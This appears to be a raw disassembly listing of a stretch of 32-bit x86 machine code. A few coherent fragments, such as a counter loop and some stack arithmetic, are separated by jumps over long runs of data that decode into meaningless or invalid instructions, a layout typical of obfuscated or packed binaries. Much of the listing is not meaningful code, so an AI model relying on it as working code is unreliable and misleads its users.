  40ea5a:	mov    esi,0xd1276bbd
  40ea5f:	add    eax,ecx
  40ea61:	rcr    DWORD PTR [esi+0x2a],0x46
  40ea65:	retf   0xc96b
  40ea68:	lea    eax,[ebp+0x6f93a8fb]
  40ea6e:	lods   eax,DWORD PTR ds:[esi]
  40ea6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea70:	mov    ds:0x48df4950,al
  40ea75:	jns    0x48f25da3
  40ea7b:	xor    DWORD PTR [edi],ebx
  40ea7d:	jecxz  0x40ea15
  40ea7f:	retf   
  40ea80:	or     DWORD PTR [ecx-0x68a5d466],ebp
  40ea86:	sbb    DWORD PTR [ebx+ebx*8-0x44c53c01],ecx
  40ea8d:	sub    eax,0xb65c0934
  40ea92:	cmp    BYTE PTR [ecx],al
  40ea94:	jno    0x40eb0a
  40ea96:	std    
  40ea97:	cmp    ch,BYTE PTR [ebp+eax*4+0x7b638bf7]
  40ea9e:	pusha  
  40ea9f:	jno    0xa6c5fa75
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	gs std 
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e1a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e1a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e1a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e1b0
  40eafd:	push   0x42e1ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e38f
  40eb15:	cmp    DWORD PTR ds:0x42e1a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e1a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e1a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xf6
  40eb8d:	mov    ebp,0xaff7d5d1
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb9b
  40eb99:	aam    0x84
  40eb9b:	arpl   WORD PTR [ebp-0x41],ax
  40eb9e:	out    0xcf,al
  40eba0:	out    0xda,al
  40eba2:	pop    ebp
  40eba3:	xor    eax,0x2f03225b
  40eba8:	push   0xffffffbf
  40ebaa:	xor    al,0x46
  40ebac:	inc    edx
  40ebad:	aam    0xee
  40ebaf:	jg     0x40eba0
  40ebb1:	pop    esp
  40ebb2:	in     eax,0xdb
  40ebb4:	mov    BYTE PTR ds:0xf2521335,bh
  40ebba:	aas    
  40ebbb:	push   ecx
  40ebbc:	pop    ebp
  40ebbd:	cdq    
  40ebbe:	mov    eax,ds:0xbc2aadf0
  40ebc3:	out    dx,eax
  40ebc4:	mov    WORD PTR [edi+edi*8+0xb],?
  40ebc8:	jge    0x40ec02
  40ebca:	bound  ebp,QWORD PTR [esi-0x31697d1c]
  40ebd0:	push   ss
  40ebd1:	fidivr WORD PTR [edi]
  40ebd3:	adc    ah,BYTE PTR [eax+0x517d34b9]
  40ebd9:	mov    al,0xff
  40ebdb:	add    DWORD PTR cs:[ebx-0x1f4fc685],0x26
  40ebe3:	push   ds
  40ebe4:	adc    ecx,esi
  40ebe6:	or     al,0xae
  40ebe8:	and    DWORD PTR [ecx+0x4ba45748],ecx
  40ebee:	(bad)
  40ebf3:	mov    bl,0x3a
  40ebf5:	sbb    BYTE PTR [ecx-0x3ec4586d],bl
  40ebfb:	out    dx,al
  40ebfc:	inc    ebp
  40ebfd:	cdq    
  40ebfe:	mov    esi,0x9a61fcc1
  40ec03:	push   eax
  40ec04:	adc    BYTE PTR [edx+0x7e94a6ae],al
  40ec0a:	loop   0x40ebba
  40ec0c:	push   esi
  40ec0d:	mov    dl,0x83
  40ec0f:	fcomp  DWORD PTR [ecx+0x497609d6]
  40ec15:	stos   DWORD PTR es:[di],eax
  40ec17:	sbb    al,0x40
  40ec19:	pop    ebx
  40ec1a:	add    esi,ebx
  40ec1c:	(bad)  
  40ec1d:	jmp    0x40ec3c
  40ec1f:	jl     0x40ebd3
  40ec21:	jmp    0xff00:0x854c55ac
  40ec28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec29:	(bad)  
  40ec2a:	xchg   ebp,eax
  40ec2b:	jae    0x40ec15
  40ec2d:	or     ebp,ebx
  40ec2f:	push   0x70e0984c
  40ec34:	std    
  40ec35:	mov    DWORD PTR [eax+0x23],ecx
  40ec38:	dec    esp
  40ec39:	mov    al,ds:0x4b4ee96b
  40ec3e:	jmp    FWORD PTR [ebx-0x8c41615]
  40ec44:	jo     0x40ecaa
  40ec46:	out    0x17,al
  40ec48:	adc    al,0x2f
  40ec4a:	ss ret 
  40ec4c:	mov    edx,0xf91f8258
  40ec51:	push   ecx
  40ec52:	imul   eax,ebp,0xd288cd73
  40ec58:	add    BYTE PTR [ecx-0xe],bl
  40ec5b:	push   ecx
  40ec5c:	jo     0x40ecbd
  40ec5e:	shl    esp,1
  40ec60:	pop    es
  40ec61:	mov    esp,0x629c4f
  40ec66:	push   edi
  40ec67:	shl    DWORD PTR [edi+0x65cb6cb7],1
  40ec6d:	jne    0x40ec1b
  40ec6f:	sbb    al,0xe3
  40ec71:	ja     0x40eca1
  40ec73:	jecxz  0x40ecb1
  40ec75:	sbb    DWORD PTR [edx-0x5],esp
  40ec78:	jecxz  0x40ec20
  40ec7a:	inc    esi
  40ec7b:	icebp  
  40ec7c:	(bad)  
  40ec7d:	sbb    eax,0x3cbf9455
  40ec82:	push   esi
  40ec83:	daa    
  40ec84:	push   ss
  40ec85:	and    dh,BYTE PTR [ebx-0x2]
  40ec88:	adc    ebp,DWORD PTR [ecx-0x24eeb479]
  40ec8e:	icebp  
  40ec8f:	adc    BYTE PTR [edi-0x62],cl
  40ec92:	xchg   edi,eax
  40ec93:	daa    
  40ec94:	test   DWORD PTR [edx+ebx*1],ecx
  40ec97:	clc    
  40ec98:	add    eax,0x729942e
  40ec9d:	fidivr WORD PTR [esp+esi*1-0x51]
  40eca1:	pop    edi
  40eca2:	iret   
  40eca3:	ror    BYTE PTR [edi-0x4c9caea3],1
  40eca9:	cli    
  40ecaa:	xor    DWORD PTR [ecx-0x1b],ebp
  40ecad:	and    al,0x75
  40ecaf:	call   0x4580c674
  40ecb4:	xchg   esi,eax
  40ecb5:	mov    eax,0x45ac035e
  40ecba:	mov    cs,WORD PTR [esi]
  40ecbc:	adc    eax,DWORD PTR [ebx-0x41]
  40ecbf:	inc    edx
  40ecc0:	out    dx,al
  40ecc1:	outs   dx,DWORD PTR ds:[esi]
  40ecc2:	or     DWORD PTR [esi-0x46],ecx
  40ecc5:	mov    al,ds:0x50fe547f
  40ecca:	ror    ebp,cl
  40eccc:	ds cmc 
  40ecce:	and    esp,DWORD PTR [ebp+0x77]
  40ecd1:	sub    bl,BYTE PTR [ecx+eax*4]
  40ecd4:	imul   ecx,DWORD PTR [ebx-0x2a],0x7
  40ecd8:	mov    esi,0xcfa2ad4c
  40ecdd:	push   ecx
  40ecde:	fnstcw WORD PTR [eax-0x4c]
  40ece1:	cmp    BYTE PTR [ebp-0x3ec4482f],bl
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed4a
  40ed00:	mov    edx,0xaebac1f0
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ec8d
  40ed0c:	hlt    
  40ed0d:	push   cs
  40ed0e:	aam    0x2f
  40ed10:	pop    ecx
  40ed11:	xchg   esi,eax
  40ed13:	inc    edx
  40ed14:	adc    BYTE PTR [eax+0x3431867],dl
  40ed1a:	adc    ch,BYTE PTR [eax-0x45a3d497]
  40ed20:	out    dx,eax
  40ed21:	js     0x40ed50
  40ed23:	inc    esp
  40ed24:	scas   eax,DWORD PTR es:[edi]
  40ed25:	adc    ebx,edi
  40ed27:	or     ebp,edi
  40ed29:	jns    0x40ed6d
  40ed2b:	push   ss
  40ed2c:	test   al,0x53
  40ed2e:	jl     0x40ecee
  40ed30:	mov    al,0x80
  40ed32:	add    DWORD PTR [eax+0x19bc4b30],esi
  40ed38:	(bad)  
  40ed39:	sahf   
  40ed3a:	cdq    
  40ed3b:	(bad)  
  40ed3c:	in     eax,dx
  40ed3d:	xchg   ebp,eax
  40ed3e:	jne    0x40ecf0
  40ed40:	xor    esp,ecx
  40ed42:	in     eax,dx
  40ed43:	inc    ebx
  40ed44:	out    dx,eax
  40ed45:	add    eax,0xbd733ce7
  40ed4a:	inc    ebx
  40ed4b:	repz frstor [ebx+0x29]
  40ed4f:	xor    esp,DWORD PTR [ebx-0x31]
  40ed52:	push   esi
  40ed53:	and    dl,BYTE PTR [ebp+ecx*1+0x7f]
  40ed57:	int3   
  40ed58:	inc    eax
  40ed59:	sub    al,0xcf
  40ed5b:	inc    esp
  40ed5c:	repnz jmp 0x805e:0xa3eb5d91
  40ed64:	mul    al
  40ed66:	xor    BYTE PTR [eax-0x2dad0993],al
  40ed6c:	sub    bl,bh
  40ed6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed6f:	jb     0x40ed7f
  40ed71:	jge    0x40eda4
  40ed73:	cmp    bh,BYTE PTR [edx+esi*4]
  40ed76:	pop    esp
  40ed77:	sub    edi,esp
  40ed79:	loope  0x40edd7
  40ed7b:	or     al,0x90
  40ed7d:	mov    ds:0x1a2e3740,al
  40ed82:	add    eax,0xdc5d6b0e
  40ed87:	ret    0x7e25
  40ed8a:	loopne 0x40edc7
  40ed8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed8d:	adc    BYTE PTR [ecx-0x7ee3f0d2],ah
  40ed93:	(bad)  
  40ed95:	and    edx,edx
  40ed97:	add    bh,BYTE PTR [esi+ebx*2+0x5d]
  40ed9b:	xor    edx,eax
  40ed9d:	push   ebx
  40ed9e:	xchg   ebx,eax
  40ed9f:	sbb    BYTE PTR [eax+ebp*8-0x491ce769],0xaa
  40eda7:	sub    DWORD PTR [edx-0x4d],esp
  40edaa:	lea    esi,[esi]
  40edac:	pop    eax
  40edad:	inc    eax
  40edae:	dec    BYTE PTR [edi]
  40edb0:	sub    BYTE PTR [ecx-0x72],ah
  40edb3:	loop   0x40ed99
  40edb5:	scas   eax,DWORD PTR es:[edi]
  40edb6:	ins    BYTE PTR es:[edi],dx
  40edb7:	adc    BYTE PTR [edi+eax*2+0x40],0xe8
  40edbc:	add    BYTE PTR ds:0x60abad14,0xe5
  40edc3:	test   ebp,edx
  40edc5:	push   eax
  40edc6:	sahf   
  40edc7:	push   ds
  40edc8:	xchg   ebp,eax
  40edc9:	mov    al,ds:0x4035ea9b
  40edce:	fadd   st(4),st
  40edd0:	mov    ds:0x4f26b616,al
  40edd5:	int    0x2b
  40edd7:	lea    edx,[edi]
  40edd9:	sbb    al,0x51
  40eddb:	jmp    0x40edaf
  40eddd:	mov    ds:0xdc27eb31,eax
  40ede2:	in     eax,0x9a
  40ede4:	ja     0x40ede5
  40ede6:	jb     0x40ed98
  40ede8:	mov    eax,ds:0xcae36040
  40eded:	and    dl,BYTE PTR [ebx*8-0x30f7c40f]
  40edf4:	mov    edx,DWORD PTR [edi-0xe]
  40edf7:	and    eax,0x982fa869
  40edfc:	xor    BYTE PTR [ebx],dl
  40edfe:	stos   BYTE PTR es:[edi],al
  40edff:	sbb    DWORD PTR [ebp-0x10480e19],edx
  40ee05:	inc    esp
  40ee06:	and    BYTE PTR [edx+0x1],0xa9
  40ee0a:	mov    DWORD PTR [edx+ecx*4-0x516bb1a4],edx
  40ee11:	fwait
  40ee12:	sub    cl,BYTE PTR [ebx+0x54]
  40ee15:	mov    ah,0x7b
  40ee17:	xchg   cl,cl
  40ee19:	sbb    ebp,DWORD PTR [ecx-0x69]
  40ee1c:	push   edi
  40ee1d:	dec    eax
  40ee1e:	mov    DWORD PTR [ebx+0x25e018dd],esp
  40ee24:	sti    
  40ee25:	ins    BYTE PTR es:[edi],dx
  40ee26:	inc    ebx
  40ee27:	rcl    DWORD PTR [ecx-0x5d],cl
  40ee2a:	jb     0x40ee95
  40ee2c:	blcic  esp,DWORD PTR [edx]
  40ee31:	mov    ah,bl
  40ee33:	adc    esp,DWORD PTR [esi+edx*2+0x75c00408]
  40ee3a:	(bad)  
  40ee3c:	inc    esp
  40ee3d:	inc    ebp
  40ee3e:	icebp  
  40ee3f:	(bad)  
  40ee40:	loop   0x40ee12
  40ee42:	mov    esp,0x93a1875e
  40ee47:	jne    0x40ede0
  40ee49:	and    bh,0xd
  40ee4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee4d:	ss push ds
  40ee4f:	add    eax,0x88a894a4
  40ee54:	push   edi
  40ee55:	pop    es
  40ee56:	pop    edi
  40ee57:	pop    edi
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x44
  40ee7f:	mov    ah,0x54
  40ee81:	mov    cl,0xd
  40ee83:	lods   al,BYTE PTR ds:[esi]
  40ee84:	jo     0x40eef6
  40ee86:	ret    
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee64
  40ee8b:	and    al,0x88
  40ee8d:	add    DWORD PTR [ecx-0x4e86e540],0x18
  40ee94:	js     0x40ee26
  40ee96:	pop    esp
  40ee97:	pop    ecx
  40ee98:	adc    DWORD PTR [esi+edx*4+0x667aea6b],0x4a
  40eea0:	xchg   esi,eax
  40eea1:	push   ecx
  40eea2:	ins    BYTE PTR es:[edi],dx
  40eea3:	scas   eax,DWORD PTR es:[edi]
  40eea4:	leave  
  40eea5:	push   edx
  40eea6:	ins    BYTE PTR es:[edi],dx
  40eea7:	adc    eax,0xe71bd44b
  40eeac:	cmp    DWORD PTR [ebx+0x6551277c],0xffffffeb
  40eeb3:	sub    DWORD PTR [esi+0x51],esi
  40eeb6:	jmp    DWORD PTR ds:0xbd6bdbca
  40eebc:	repz xor bl,bl
  40eebf:	or     al,0xfe
  40eec1:	dec    edi
  40eec2:	cdq    
  40eec3:	in     al,0x5f
  40eec5:	in     al,dx
  40eec6:	fwait
  40eec7:	dec    ebp
  40eec8:	test   DWORD PTR [edi+0x5a423bd2],edx
  40eece:	je     0x40ee74
  40eed0:	sar    BYTE PTR [edx],1
  40eed2:	ret    0xb87
  40eed5:	jns    0x40ef4e
  40eed7:	xchg   edx,eax
  40eed8:	repnz aam 0xf3
  40eedb:	mov    dl,BYTE PTR [ebx-0x373ec5d1]
  40eee1:	xor    ebx,DWORD PTR [edx-0x10]
  40eee4:	jne    0x40eea2
  40eee6:	add    DWORD PTR [edi],0x9685a8bd
  40eeec:	call   0x43d0ee64
  40eef1:	sub    DWORD PTR ds:0x4fd89641,0x66
  40eef8:	ror    DWORD PTR [eax+eiz*1-0xaa93c69],cl
  40eeff:	add    eax,DWORD PTR [edx-0x18]
  40ef02:	jp     0x40ef1e
  40ef04:	(bad)  
  40ef05:	call   0x1c2c3684
  40ef0a:	pop    esp
  40ef0b:	xor    dh,BYTE PTR [ebx]
  40ef0d:	sub    DWORD PTR [edx],esp
  40ef0f:	in     eax,0x21
  40ef11:	xor    ebp,eax
  40ef13:	add    DWORD PTR [bp+di-0x43],ebp
  40ef17:	mov    ebp,0xcd5ce290
  40ef1c:	scas   eax,DWORD PTR es:[edi]
  40ef1d:	add    BYTE PTR [ebp-0x6d],bl
  40ef20:	scas   al,BYTE PTR es:[edi]
  40ef21:	cwde   
  40ef22:	cld    
  40ef23:	lea    ebx,[edx-0x4b369b53]
  40ef29:	sbb    cl,BYTE PTR [ebx-0xf2ceb6f]
  40ef2f:	cli    
  40ef30:	add    eax,0x272112cb
  40ef35:	sub    eax,0x4fdef378
  40ef3a:	in     eax,dx
  40ef3b:	sub    DWORD PTR [edx+0x4dce6424],eax
  40ef41:	dec    ebx
  40ef42:	fdivr  DWORD PTR [eax-0x2cf20640]
  40ef48:	rcl    edi,0x87
  40ef4b:	das    
  40ef4c:	popa   
  40ef4d:	and    al,0x5e
  40ef4f:	pop    ebp
  40ef50:	mov    cl,0x8a
  40ef52:	cli    
  40ef53:	clc    
  40ef54:	and    DWORD PTR [ecx+eax*8],esi
  40ef57:	push   edi
  40ef58:	push   0x1410a7cc
  40ef5d:	inc    eax
  40ef5e:	pop    edi
  40ef5f:	cwde   
  40ef60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef61:	jp     0x40eef8
  40ef63:	inc    eax
  40ef64:	push   cs
  40ef65:	jecxz  0x40ef59
  40ef67:	popf   
  40ef68:	mov    ah,ah
  40ef6a:	cmp    BYTE PTR [ecx],bl
  40ef6c:	aam    0xa2
  40ef6e:	call   0x90ae4599
  40ef73:	shr    BYTE PTR [esp+edi*8],cl
  40ef76:	dec    ebp
  40ef77:	popf   
  40ef78:	inc    ecx
  40ef79:	daa    
  40ef7a:	lods   al,BYTE PTR ds:[esi]
  40ef7b:	outs   dx,DWORD PTR ds:[esi]
  40ef7c:	(bad)  
  40ef7d:	out    dx,eax
  40ef7e:	push   0x7549f54e
  40ef83:	push   esi
  40ef84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef85:	je     0x40ef3b
  40ef87:	sub    ah,BYTE PTR [edi]
  40ef89:	mov    ebp,0xa3d84c28
  40ef8e:	push   ds
  40ef8f:	mov    esp,0x528d0d11
  40ef94:	sar    ch,0xb6
  40ef97:	rep data16 lods al,BYTE PTR ds:[esi]
  40ef9a:	jo     0x40efb1
  40ef9c:	aam    0xed
  40ef9e:	mov    esi,0xa407a494
  40efa3:	mov    ah,0xfc
  40efa5:	out    dx,eax
  40efa6:	or     ebx,ebp
  40efa8:	mov    bh,BYTE PTR [edi]
  40efaa:	mov    bl,0x77
  40efac:	inc    esi
  40efad:	mov    ds:0x21c65636,al
  40efb2:	push   esp
  40efb3:	sub    edi,DWORD PTR [eax]
  40efb5:	push   cs
  40efb6:	je     0x40efe9
  40efb8:	mov    bh,dh
  40efba:	dec    ebx
  40efbb:	mov    edx,0x65343118
  40efc0:	mov    ebp,0x4bb7291a
  40efc5:	int    0xa4
  40efc7:	jmp    0xa5d3:0x2d7fb265
  40efce:	mov    cl,BYTE PTR [ebx-0x51b592a8]
  40efd4:	sbb    al,0x0
  40efd6:	fidiv  DWORD PTR [ebx]
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	pop    edx
  40effb:	or     al,0xbf
  40effd:	daa    
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	push   esi
  40f007:	and    bh,BYTE PTR [esi+0x3b]
  40f00a:	aaa    
  40f00b:	push   cs
  40f00c:	inc    ecx
  40f00d:	rcl    DWORD PTR [edx+0x3b],1
  40f010:	or     eax,0x3a7cf8bc
  40f015:	je     0x40efa2
  40f017:	xor    al,BYTE PTR [ebp+0x77]
  40f01a:	mov    esi,0x5a366e3c
  40f01f:	jmp    0xa250:0x8ff70cdd
  40f026:	mov    esp,0xe37e3c54
  40f02b:	push   edi
  40f02c:	retf   0xbea
  40f02f:	push   esp
  40f030:	fisubr DWORD PTR [edi+0x5ff56441]
  40f036:	in     al,0xf1
  40f038:	xor    al,0x88
  40f03a:	mov    al,0xd2
  40f03c:	pop    ss
  40f03d:	push   ss
  40f03e:	xchg   ecx,eax
  40f03f:	mov    DWORD PTR fs:[ebx+esi*8],ebx
  40f043:	hlt    
  40f044:	adc    BYTE PTR [edi+0x65],dh
  40f047:	adc    BYTE PTR [edi+0x1c2cc4a7],al
  40f04d:	jp     0x40f008
  40f04f:	inc    edi
  40f050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f051:	into   
  40f052:	inc    edi
  40f053:	das    
  40f054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f055:	jae    0x40f0af
  40f057:	pop    ss
  40f058:	aas    
  40f059:	dec    ecx
  40f05a:	jmp    0xa40d:0xf456a5f9
  40f061:	push   ecx
  40f062:	mov    WORD PTR [eax],ss
  40f064:	(bad)  
  40f065:	mov    dl,0xa2
  40f067:	ret    0xf93d
  40f06a:	(bad)  
  40f06b:	jmp    0x1537:0x5a61b1cf
  40f072:	loop   0x40f0db
  40f074:	retf   
  40f075:	mov    edi,0x59d79d68
  40f07a:	pop    edi
  40f07b:	fstp   DWORD PTR [edi]
  40f07d:	push   esp
  40f07e:	jmp    0x40f079
  40f080:	and    esi,DWORD PTR [ebx-0x372cbc3]
  40f086:	add    ch,BYTE PTR [ebx-0x65289121]
  40f08c:	jnp    0x40f0ab
  40f08e:	outs   dx,DWORD PTR ds:[esi]
  40f08f:	push   edi
  40f090:	jb     0x40f04c
  40f092:	or     DWORD PTR [eax-0xac0d5d3],ebp
  40f098:	mov    dh,0x5a
  40f09a:	cmps   DWORD PTR fs:[si],DWORD PTR es:[di]
  40f09d:	mov    ds:0xcd4cfb5d,al
  40f0a2:	add    BYTE PTR [edx-0x18],dl
  40f0a5:	mov    esp,0xe11d5e27
  40f0aa:	adc    bh,BYTE PTR [ecx]
  40f0ac:	ins    BYTE PTR es:[edi],dx
  40f0ad:	xor    cl,ch
  40f0af:	add    BYTE PTR [ebp+0x11488ada],0x1a
  40f0b6:	fisttp QWORD PTR [esi]
  40f0b8:	mov    eax,0x21fcc2c8
  40f0bd:	outs   dx,DWORD PTR ds:[esi]
  40f0be:	icebp  
  40f0bf:	mov    ecx,ecx
  40f0c1:	lods   al,BYTE PTR ds:[esi]
  40f0c2:	jl     0x40f13e
  40f0c4:	test   DWORD PTR [esi+0x33],esi
  40f0c7:	sub    dl,BYTE PTR [ecx]
  40f0c9:	sbb    edi,DWORD PTR cs:[eax]
  40f0cc:	lea    edx,[eax-0x2e]
  40f0cf:	pop    ebp
  40f0d0:	jmp    0x5ba4:0xd76b7656
  40f0d7:	mov    ah,0x42
  40f0d9:	or     eax,0x77b91ce2
  40f0de:	pop    esp
  40f0df:	aaa    
  40f0e0:	and    eax,0x1859ba95
  40f0e5:	push   ebx
  40f0e6:	pusha  
  40f0e7:	xchg   ebx,eax
  40f0e8:	mov    ds:0x9b225ecb,al
  40f0ed:	mov    ebx,DWORD PTR [ebx-0x21]
  40f0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f1:	push   0x3e
  40f0f3:	stos   DWORD PTR es:[edi],eax
  40f0f4:	and    dh,bl
  40f0f6:	aam    0xe6
  40f0f8:	sub    eax,DWORD PTR [ebp-0x752cf64c]
  40f0fe:	sbb    DWORD PTR [eax-0x25],0x61042fe9
  40f105:	jbe    0x40f14c
  40f107:	jmp    DWORD PTR [esp+eiz*8-0x79734f77]
  40f10e:	and    al,0x9d
  40f110:	ret    0x76e7
  40f113:	jns    0x40f172
  40f115:	das    
  40f116:	pop    esp
  40f117:	call   0x37c3:0xe3913fbe
  40f11e:	loop   0x40f0c4
  40f120:	jnp    0x40f116
  40f122:	xchg   edx,eax
  40f123:	pop    es
  40f124:	mov    ds:0x1d00ce35,eax
  40f129:	fidiv  WORD PTR [edx]
  40f12b:	popf   
  40f12c:	xchg   ecx,eax
  40f12d:	test   BYTE PTR [eax+0x6],ch
  40f130:	and    cl,BYTE PTR [edi-0x3c018c3a]
  40f136:	mov    ebp,0x5aa7fd21
  40f13b:	jmp    0x188117ca
  40f140:	and    DWORD PTR [ecx+0x20f2031d],esi
  40f146:	sbb    cl,BYTE PTR [ebx+ebx*1]
  40f149:	pop    esi
  40f14a:	add    ecx,esi
  40f14c:	js     0x40f155
  40f14e:	adc    al,0x4b
  40f150:	ss mov cl,0x76
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   ebx,esp
  40f16e:	ins    BYTE PTR es:[edi],dx
  40f16f:	(bad)  
  40f170:	ja     0x40f115
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f185
  40f17a:	pop    ebp
  40f17b:	xor    DWORD PTR [ecx+0x225667e9],edi
  40f181:	cld    
  40f182:	sub    esi,DWORD PTR [ecx*4+0x1cd01e2d]
  40f189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f18a:	shl    cl,cl
  40f18c:	and    eax,0x8a5c4a46
  40f191:	sub    esp,DWORD PTR [eax+0x34]
  40f194:	jnp    0x40f16a
  40f196:	mov    ebp,DWORD PTR [eax-0x330f877]
  40f19c:	(bad)  
  40f19d:	daa    
  40f19e:	adc    BYTE PTR [edx],cl
  40f1a0:	add    esp,ebx
  40f1a2:	and    bl,BYTE PTR [edi+0x5b]
  40f1a5:	push   edx
  40f1a6:	sbb    eax,0x5efc8866
  40f1ab:	pop    eax
  40f1ac:	xchg   edx,eax
  40f1ad:	jno    0x40f20e
  40f1af:	dec    esp
  40f1b0:	add    eax,0x94f8913f
  40f1b5:	sbb    edx,esi
  40f1b7:	pop    eax
  40f1b8:	jbe    0x40f180
  40f1ba:	sbb    dh,BYTE PTR [ecx-0x585c888a]
  40f1c0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40f1c2:	push   eax
  40f1c3:	jo     0x40f1ba
  40f1c5:	xlat   BYTE PTR ds:[ebx]
  40f1c6:	(bad)  
  40f1c7:	out    0xa7,al
  40f1c9:	mov    dl,dh
  40f1cb:	xchg   bh,ah
  40f1cd:	cmp    BYTE PTR [ecx-0x73],ah
  40f1d0:	jge    0x40f1d8
  40f1d2:	jae    0x40f17a
  40f1d4:	mov    ecx,0xab1d6c37
  40f1d9:	test   BYTE PTR [ecx],ch
  40f1db:	(bad)  
  40f1dc:	in     eax,0x83
  40f1de:	xor    BYTE PTR [ecx+0x5],dl
  40f1e1:	mov    ebx,0xc9a04801
  40f1e6:	das    
  40f1e7:	loope  0x40f1d4
  40f1e9:	add    DWORD PTR [edi+ebx*4],ecx
  40f1ec:	ds div bl
  40f1ef:	dec    edi
  40f1f0:	push   esi
  40f1f1:	out    dx,al
  40f1f2:	fstp   TBYTE PTR [ecx+edi*4-0x2cf31033]
  40f1f9:	push   es
  40f1fa:	push   DWORD PTR [edx]
  40f1fc:	xchg   esp,eax
  40f1fd:	cld    
  40f1fe:	cwde   
  40f1ff:	dec    eax
  40f200:	in     al,dx
  40f201:	push   ebx
  40f202:	call   0x421178e6
  40f207:	inc    esi
